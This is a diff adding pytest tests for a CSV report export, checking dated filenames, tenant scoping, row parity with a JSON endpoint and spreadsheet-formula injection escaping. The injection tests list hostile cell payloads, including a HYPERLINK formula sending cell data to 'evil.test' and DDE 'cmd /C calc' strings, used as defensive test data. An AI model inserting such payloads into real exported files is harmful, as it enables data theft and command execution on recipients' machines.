@@ -12,6 +12,8 @@ Real-Postgres tests via the shared ``db`` fixture; skip without DB_URL.
 
 from __future__ import annotations
 
+import csv
+import io
 import os
 from contextlib import contextmanager
 from datetime import UTC, datetime, timedelta
@@ -359,3 +361,229 @@ def test_endpoint_returns_empty_rows_and_zero_totals_when_quiet(db) -> None:
     body = res.json()
     assert body["rows"] == []
     assert body["totals"] == {"credits_spent": 0, "conversations": 0, "leads": 0}
+
+
+# ── CSV export ───────────────────────────────────────────────────────────────
+#
+# The agency hands this file to its own client, so it leaves OyeChats' trust
+# boundary entirely: the rows must match the dashboard exactly, the filename
+# must say which window it covers, and a customer-typed agent name must never
+# execute in the recipient's spreadsheet.
+
+
+def _call_csv(db, client: Client, *, days: int | None = None):
+    from unittest.mock import patch
+
+    from app.api import analytics_routes
+
+    url = "/analytics/by-bot.csv" if days is None else f"/analytics/by-bot.csv?days={days}"
+    with patch.object(analytics_routes, "get_session", lambda: _session_cm(db)):
+        return _api(client).get(url)
+
+
+def _parse_csv(res) -> list[list[str]]:
+    """Read the response body back through a real CSV parser."""
+    return list(csv.reader(io.StringIO(res.text)))
+
+
+def _expected_filenames(before: datetime, after: datetime, *, days: int) -> set[str]:
+    """Every filename the route could legitimately have produced.
+
+    The route stamps its own ``datetime.now(UTC)``, so a request that straddles
+    midnight UTC may land on either date. Both are correct.
+    """
+    return {
+        f"oyechats-report-{(moment - timedelta(days=days)):%Y-%m-%d}-to-{moment:%Y-%m-%d}.csv"
+        for moment in (before, after)
+    }
+
+
+def test_csv_sends_a_dated_attachment(db) -> None:
+    client = _make_client(db, email="rollup-csv-headers@e.com")
+    bot = _make_bot(db, client, name="Alpha", key="bot-csv-headers-alpha")
+    _ledger(db, client, delta=-2, reason="ai_chat", attributed_bot_id=bot.id, bot_id=None)
+    db.commit()
+
+    before = datetime.now(UTC)
+    res = _call_csv(db, client, days=7)
+    after = datetime.now(UTC)
+
+    assert res.status_code == 200, res.text
+    assert res.headers["content-type"].startswith("text/csv")
+    disposition = res.headers["content-disposition"]
+    assert disposition.startswith("attachment; ")
+    assert disposition in {f'attachment; filename="{name}"' for name in _expected_filenames(before, after, days=7)}
+
+
+def test_csv_rows_match_the_json_endpoint(db) -> None:
+    """Same window, same auth, same rows — in the same order, tenant-scoped."""
+    client = _make_client(db, email="rollup-csv-rows@e.com")
+    other = _make_client(db, email="rollup-csv-rows-other@e.com")
+    alpha = _make_bot(db, client, name="Alpha", key="bot-csv-rows-alpha")
+    beta = _make_bot(db, client, name="Beta", key="bot-csv-rows-beta")
+    intruder = _make_bot(db, other, name="Intruder", key="bot-csv-rows-intruder")
+
+    _ledger(db, client, delta=-8, reason="ai_chat", attributed_bot_id=alpha.id, bot_id=None)
+    _ledger(db, client, delta=-3, reason="company_name", attributed_bot_id=beta.id, bot_id=None)
+    _session_row(db, alpha, sid="s-csv-1")
+    _session_row(db, alpha, sid="s-csv-2")
+    _lead(db, beta, sid="s-csv-3")
+    _ledger(db, other, delta=-1000, reason="ai_chat", attributed_bot_id=intruder.id, bot_id=None)
+    db.commit()
+
+    res = _call_csv(db, client)
+    assert res.status_code == 200, res.text
+
+    rows = _parse_csv(res)
+    # Header, then one row per active agent. Columns are agent name,
+    # conversations, leads, credits used — credits LAST, unlike the JSON row
+    # shape, so the reading order matches how the report is talked about.
+    assert rows == [
+        ["Agent", "Conversations", "Leads", "Credits used"],
+        ["Alpha", "2", "0", "8"],
+        # Beta's lead created its own session, so it has one conversation too.
+        ["Beta", "1", "1", "3"],
+    ]
+
+    # The other account's agent appears nowhere in the file — not as a row,
+    # not as a stray name.
+    assert "Intruder" not in res.text
+
+    # And the same request against the JSON endpoint agrees, row for row.
+    body = _call(db, client).json()
+    assert [row["bot_name"] for row in body["rows"]] == [row[0] for row in rows[1:]]
+
+
+def test_csv_is_empty_but_well_formed_for_a_quiet_account(db) -> None:
+    client = _make_client(db, email="rollup-csv-quiet@e.com")
+    _make_bot(db, client, name="Alpha", key="bot-csv-quiet-alpha")
+    db.commit()
+
+    res = _call_csv(db, client)
+    assert res.status_code == 200, res.text
+    # Still a valid CSV a spreadsheet can open — a header and nothing else.
+    assert _parse_csv(res) == [["Agent", "Conversations", "Leads", "Credits used"]]
+
+
+def test_csv_rejects_out_of_bounds_days(db) -> None:
+    """Identical window validation to the JSON endpoint."""
+    client = _make_client(db, email="rollup-csv-bounds@e.com")
+    db.commit()
+
+    assert _call_csv(db, client, days=0).status_code == 422
+    assert _call_csv(db, client, days=366).status_code == 422
+    assert _call_csv(db, client, days=90).status_code == 200
+
+
+# ── CSV injection ────────────────────────────────────────────────────────────
+#
+# Two layers, deliberately: the escape itself is unit-tested against the whole
+# OWASP trigger list, and the endpoint tests prove the escape is actually wired
+# into the response a customer downloads.
+
+
+@pytest.mark.parametrize(
+    ("payload", "why"),
+    [
+        ('=HYPERLINK("https://evil.test/?"&A1,"Click")', "formula"),
+        ('+cmd|" /C calc"!A0', "signed expression / DDE"),
+        ('-2+3+cmd|" /C calc"!A0', "signed expression / DDE"),
+        ("@SUM(1+1)*cmd|' /C calc'!A0", "legacy Lotus-style formula"),
+        # Excel strips a leading TAB/CR before deciding whether the cell is a
+        # formula, so a check that only looks for "=" misses these two.
+        ("\t=1+1", "TAB-prefixed formula"),
+        ("\r=1+1", "CR-prefixed formula"),
+    ],
+)
+def test_csv_safe_neutralises_every_formula_trigger(payload: str, why: str) -> None:
+    from app.api.analytics_routes import _csv_safe
+
+    escaped = _csv_safe(payload)
+    # The defence: a leading single quote, so the spreadsheet reads the rest of
+    # the cell as literal text rather than as an expression.
+    assert escaped == f"'{payload}", why
+    assert not escaped.startswith(("=", "+", "-", "@", "\t", "\r")), why
+    # Nothing is silently dropped — the name stays fully recoverable.
+    assert escaped[1:] == payload, why
+
+
+@pytest.mark.parametrize(
+    "value",
+    ["Acme Support", 'Acme, Inc. "Main"', "", "Café ☕", "2026 Bot"],
+)
+def test_csv_safe_leaves_an_ordinary_name_alone(value: str) -> None:
+    """The escape is targeted — commas and quotes are the writer's job, not its."""
+    from app.api.analytics_routes import _csv_safe
+
+    assert _csv_safe(value) == value
+
+
+def test_csv_safe_tolerates_a_missing_name() -> None:
+    """``Bot.name`` is nullable in the schema; an export must not crash on it."""
+    from app.api.analytics_routes import _csv_safe
+
+    assert _csv_safe(None) == ""
+
+
+@pytest.mark.parametrize(
+    ("slug", "payload"),
+    [
+        ("hyperlink", '=HYPERLINK("https://evil.test/?"&A1,"Click")'),
+        ("plus", '+cmd|" /C calc"!A0'),
+        ("minus", '-2+3+cmd|" /C calc"!A0'),
+        ("at", "@SUM(1+1)*cmd|' /C calc'!A0"),
+        ("tab", "\t=1+1"),
+    ],
+)
+def test_csv_export_neutralises_a_customer_typed_agent_name(db, slug: str, payload: str) -> None:
+    """A bot name is customer-controlled and must never execute on open."""
+    client = _make_client(db, email=f"rollup-csv-inject-{slug}@e.com")
+    bot = _make_bot(db, client, name=payload, key=f"bot-csv-inject-{slug}")
+    _ledger(db, client, delta=-1, reason="ai_chat", attributed_bot_id=bot.id, bot_id=None)
+    db.commit()
+
+    res = _call_csv(db, client)
+    assert res.status_code == 200, res.text
+
+    rows = _parse_csv(res)
+    assert len(rows) == 2, rows
+    cell = rows[1][0]
+    assert cell == f"'{payload}"
+    assert not cell.startswith(("=", "+", "-", "@", "\t", "\r"))
+    # The other columns are untouched integers.
+    assert rows[1][1:] == ["0", "0", "1"]
+
+
+def test_csv_export_neutralises_a_cr_prefixed_agent_name(db) -> None:
+    """The CR case, asserted on the raw body.
+
+    A bare CR inside a quoted field is a line terminator to ``csv.reader``'s
+    universal-newline handling, so round-tripping it through the parser would
+    be testing the stdlib rather than the escape. The bytes on the wire are
+    what the recipient's spreadsheet sees, so assert on those.
+    """
+    client = _make_client(db, email="rollup-csv-inject-cr@e.com")
+    bot = _make_bot(db, client, name="\r=1+1", key="bot-csv-inject-cr")
+    _ledger(db, client, delta=-1, reason="ai_chat", attributed_bot_id=bot.id, bot_id=None)
+    db.commit()
+
+    res = _call_csv(db, client)
+    assert res.status_code == 200, res.text
+    # Quoted by the writer (it contains a line-terminator character) AND
+    # prefixed with the escape, so the cell can neither break the record apart
+    # nor start with a formula trigger.
+    assert '"\'\r=1+1"' in res.text
+    assert "\n\r=1+1" not in res.text
+
+
+def test_csv_export_leaves_an_ordinary_agent_name_alone(db) -> None:
+    """RFC-4180 territory — handled by the writer's quoting, not by the escape."""
+    client = _make_client(db, email="rollup-csv-plain@e.com")
+    bot = _make_bot(db, client, name='Acme, Inc. "Main"', key="bot-csv-plain")
+    _ledger(db, client, delta=-4, reason="ai_chat", attributed_bot_id=bot.id, bot_id=None)
+    db.commit()
+
+    res = _call_csv(db, client)
+    assert res.status_code == 200, res.text
+    rows = _parse_csv(res)
+    assert rows[1][0] == 'Acme, Inc. "Main"'
